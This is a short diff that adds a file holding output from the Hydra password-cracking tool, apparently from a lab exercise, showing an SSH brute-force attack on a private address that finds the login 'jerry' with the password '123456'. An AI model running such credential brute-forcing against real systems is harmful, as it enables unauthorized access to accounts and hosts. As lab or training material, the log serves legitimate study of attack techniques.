@@ -1,0 +1,5 @@
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes.
+
+[DATA] attacking ssh://192.168.56.101:22/
+[22][ssh] host: 192.168.56.101   login: jerry   password: 123456
+[STATUS] attack finished for 1 target (valid password found)
